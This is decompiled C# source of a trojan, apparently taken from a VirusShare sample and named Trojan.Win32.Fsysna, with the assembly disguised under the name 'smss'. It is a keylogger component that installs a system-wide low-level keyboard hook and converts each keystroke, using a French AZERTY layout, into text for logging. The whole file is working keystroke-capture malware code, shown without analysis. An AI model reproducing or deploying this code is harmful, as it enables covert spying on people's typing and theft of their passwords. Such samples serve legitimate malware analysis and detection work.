// Decompiled with JetBrains decompiler
// Type: logiciel_debutant.keyboard
// Assembly: smss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A1BF21EF-D763-4A59-AF7B-8CA6341AB6D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.bxwl-222547f66844d44d6078e1433d2096b799a8239933bba16debf1a688059013bc.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace logiciel_debutant
{
  public class keyboard
  {
    private static int Key;
    private static keyboard.KDel KHD;

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowsHookEx(
      int Hook,
      keyboard.KDel KeyDelegate,
      int HMod,
      int ThreadId);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CallNextHookEx(
      int Hook,
      int nCode,
      int wParam,
      ref keyboard.KeyStructure lParam);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int UnhookWindowsHookEx(int Hook);

    public static event keyboard.DownEventHandler Down;

    public static event keyboard.UpEventHandler Up;

    public void CreateHook()
    {
      keyboard.KHD = new keyboard.KDel(this.Proc);
      keyboard.Key = keyboard.SetWindowsHookEx(13, keyboard.KHD, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
    }

    private int Proc(int Code, int wParam, ref keyboard.KeyStructure lParam)
    {
      if (Code == 0)
      {
        switch (wParam)
        {
          case 256:
          case 260:
            keyboard.DownEventHandler downEvent = keyboard.DownEvent;
            if (downEvent != null)
            {
              downEvent(this.Feed((Keys) lParam.Code));
              break;
            }
            break;
          case 257:
          case 261:
            keyboard.UpEventHandler upEvent = keyboard.UpEvent;
            if (upEvent != null)
            {
              upEvent(this.Feed((Keys) lParam.Code));
              break;
            }
            break;
        }
      }
      return keyboard.CallNextHookEx(keyboard.Key, Code, wParam, ref lParam);
    }

    public void DiposeHook()
    {
      keyboard.UnhookWindowsHookEx(keyboard.Key);
      // ISSUE: explicit finalizer call
      this.Finalize();
    }

    private string Feed(Keys e)
    {
      switch (e)
      {
        case Keys.Back:
          return " [DELG]";
        case Keys.Tab:
          return " [TAB]";
        case Keys.Return:
          return " [ENTRER]";
        case Keys.Capital:
          return " [MAJ]";
        case Keys.Escape:
          return " [ESC]";
        case Keys.Space:
          return " ";
        case Keys.End:
          return " [FIN]";
        case Keys.Home:
          return " [DEBUT]";
        case Keys.Snapshot:
          return " [SCREEN]";
        case Keys.Insert:
          return " [INSERT]";
        case Keys.Delete:
          return " [DELD]";
        case Keys.D0:
          return "à";
        case Keys.D1:
          return "&";
        case Keys.D2:
          return "é";
        case Keys.D3:
          return "\"";
        case Keys.D4:
          return "'";
        case Keys.D5:
          return "(";
        case Keys.D6:
          return "-";
        case Keys.D7:
          return "è";
        case Keys.D8:
          return "_";
        case Keys.D9:
          return "ç";
        case Keys.A:
          return "a";
        case Keys.B:
          return "b";
        case Keys.C:
          return "c";
        case Keys.D:
          return "d";
        case Keys.E:
          return nameof (e);
        case Keys.F:
          return "f";
        case Keys.G:
          return "g";
        case Keys.H:
          return "h";
        case Keys.I:
          return "i";
        case Keys.J:
          return "j";
        case Keys.K:
          return "k";
        case Keys.L:
          return "l";
        case Keys.M:
          return "m";
        case Keys.N:
          return "n";
        case Keys.O:
          return "o";
        case Keys.P:
          return "p";
        case Keys.Q:
          return "q";
        case Keys.R:
          return "r";
        case Keys.S:
          return "s";
        case Keys.T:
          return "t";
        case Keys.U:
          return "u";
        case Keys.V:
          return "v";
        case Keys.W:
          return "w";
        case Keys.X:
          return "x";
        case Keys.Y:
          return "y";
        case Keys.Z:
          return "z";
        case Keys.LWin:
          return " [WINDOWSD]";
        case Keys.RWin:
          return " [WINDOWSG]";
        case Keys.Apps:
          return " [MENU]";
        case Keys.NumPad0:
          return "*0";
        case Keys.NumPad1:
          return "*1";
        case Keys.NumPad2:
          return "*2";
        case Keys.NumPad3:
          return "*3";
        case Keys.NumPad4:
          return "*4";
        case Keys.NumPad5:
          return "*5";
        case Keys.NumPad6:
          return "*6";
        case Keys.NumPad7:
          return "*7";
        case Keys.NumPad8:
          return "*8";
        case Keys.NumPad9:
          return "*9";
        case Keys.Multiply:
          return "*";
        case Keys.Add:
          return "+";
        case Keys.Subtract:
          return "-";
        case Keys.Decimal:
          return ".";
        case Keys.Divide:
          return "/";
        case Keys.F1:
          return " [F1]";
        case Keys.F2:
          return " [F2]";
        case Keys.F3:
          return " [F3]";
        case Keys.F4:
          return " [F4]";
        case Keys.F5:
          return " [F5]";
        case Keys.F6:
          return " [F6]";
        case Keys.F7:
          return " [F7]";
        case Keys.F8:
          return " [F8]";
        case Keys.F9:
          return " [F9]";
        case Keys.F10:
          return " [F10]";
        case Keys.F11:
          return " [F11]";
        case Keys.F12:
          return " [F12]";
        case Keys.LShiftKey:
          return " [SHIFTG]";
        case Keys.RShiftKey:
          return " [SHIFTD]";
        case Keys.LControlKey:
          return " [CTRLG]";
        case Keys.RControlKey:
          return " [CTRLD]";
        case Keys.LMenu:
          return " [ALT]";
        case Keys.RMenu:
          return "-ALTGR]";
        case Keys.OemSemicolon:
          return "$";
        case Keys.Oemplus:
          return "=";
        case Keys.Oemcomma:
          return ",";
        case Keys.OemPeriod:
          return ";";
        case Keys.OemQuestion:
          return ":";
        case Keys.Oemtilde:
          return "ù";
        case Keys.OemOpenBrackets:
          return ")";
        case Keys.OemPipe:
          return "*";
        case Keys.OemCloseBrackets:
          return "^";
        case Keys.OemQuotes:
          return "\u00B2";
        case Keys.Oem8:
          return "!";
        case Keys.OemBackslash:
          return "<";
        default:
          return "<" + Conversions.ToString((int) e) + ">";
      }
    }

    private delegate int KDel(int nCode, int wParam, ref keyboard.KeyStructure lParam);

    public delegate void DownEventHandler(string Key);

    public delegate void UpEventHandler(string Key);

    private struct KeyStructure
    {
      public int Code;
      public int ScanCode;
      public int Flags;
      public int Time;
      public int ExtraInfo;
    }
  }
}
